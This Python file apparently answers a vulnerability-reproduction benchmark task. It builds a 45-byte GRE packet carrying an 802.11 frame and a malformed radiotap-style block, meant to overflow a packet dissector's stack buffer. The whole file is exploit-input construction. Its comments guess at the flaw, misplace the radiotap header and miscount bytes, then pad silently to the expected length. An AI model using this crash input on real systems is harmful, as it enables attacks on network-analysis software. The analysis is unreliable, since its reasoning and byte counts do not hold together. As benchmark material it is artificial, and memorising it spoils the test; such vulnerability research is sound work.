import os
import tarfile
import tempfile
import struct
from typing import Optional

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is in the 802.11 dissector when called from GRE
        # The GRE dissector passes flags+version as pseudoheader, but 802.11 expects radio info
        # This mismatch can cause a stack buffer overflow when the 802.11 dissector
        # tries to read radio information from the insufficient pseudoheader
        
        # Based on the ground-truth length of 45 bytes, we construct a minimal PoC
        # that triggers the overflow by creating a GRE packet with 802.11 payload
        
        # Structure:
        # 1. GRE header (4 bytes) with protocol type for 802.11 (0x0009)
        # 2. 802.11 frame that triggers the overflow when parsed with wrong pseudoheader
        
        # The key is to create an 802.11 frame that causes the dissector to read
        # beyond the provided pseudoheader (flags+version) into uninitialized stack
        
        poc = bytearray()
        
        # GRE header (simplified - no checksum, routing, key, sequence)
        # Flags: C=0, R=0, K=0, S=0, s=0, Recur=0, Flags=0, Ver=0
        # Protocol: 0x0009 (802.11)
        poc.extend(struct.pack('!HH', 0x0000, 0x0009))
        
        # 802.11 frame that will trigger the overflow
        # We need 41 more bytes to reach total 45
        
        # 802.11 Frame Control field (2 bytes)
        # Type: Data (0x08), Subtype: 0x00, ToDS: 0, FromDS: 0
        frame_control = 0x0800
        poc.extend(struct.pack('!H', frame_control))
        
        # Duration (2 bytes)
        poc.extend(struct.pack('!H', 0x0000))
        
        # Destination MAC (6 bytes) - arbitrary
        poc.extend(b'\xaa\xaa\xaa\xaa\xaa\xaa')
        
        # Source MAC (6 bytes) - arbitrary  
        poc.extend(b'\xbb\xbb\xbb\xbb\xbb\xbb')
        
        # BSSID (6 bytes) - arbitrary
        poc.extend(b'\xcc\xcc\xcc\xcc\xcc\xcc')
        
        # Sequence Control (2 bytes)
        poc.extend(struct.pack('!H', 0x0000))
        
        # We now have 24 bytes (2+2+6+6+6+2)
        # Need 17 more bytes to reach 41 bytes of 802.11 data
        
        # The vulnerability likely occurs when the 802.11 dissector expects
        # a radio tap header or other meta information but receives only
        # the GRE flags+version. We'll add data that causes an out-of-bounds
        # read when the dissector tries to parse radio information.
        
        # Add data that looks like it could be radio information but is malformed
        # Radio tap header would normally have:
        # - Version (1 byte)
        # - Padding (1 byte)
        # - Length (2 bytes)
        # - Present flags (variable)
        
        # We'll create a minimal radio tap header that causes an overflow
        # when the dissector tries to read beyond available data
        radio_tap_header = bytearray()
        
        # Version (1) - but GRE provides version in pseudoheader, mismatch!
        radio_tap_header.append(0x00)
        
        # Padding (0)
        radio_tap_header.append(0x00)
        
        # Length - set to larger than available data to trigger overflow
        # The dissector might allocate buffer based on this length
        radio_tap_header.extend(struct.pack('<H', 255))  # Large length
        
        # Present flags - include flag for channel frequency which requires
        # additional data that won't be available
        radio_tap_header.extend(struct.pack('<I', 0x00000800))  # Channel flag
        
        # Channel data (4 bytes frequency, 2 bytes flags, 2 bytes unknown)
        # But we won't provide all of it - this causes the dissector to read
        # beyond buffer when trying to parse channel information
        radio_tap_header.extend(struct.pack('<I', 2412))  # Frequency
        
        # We now have 4 (GRE) + 24 (802.11) + 12 (radio tap) = 40 bytes
        # Add 1 more byte to reach 45 total
        radio_tap_header.append(0x00)
        
        # Combine
        poc.extend(radio_tap_header)
        
        # Ensure total length is 45 bytes
        if len(poc) != 45:
            # If not, pad or truncate (shouldn't happen with this construction)
            poc = poc[:45]
            while len(poc) < 45:
                poc.append(0x00)
        
        return bytes(poc)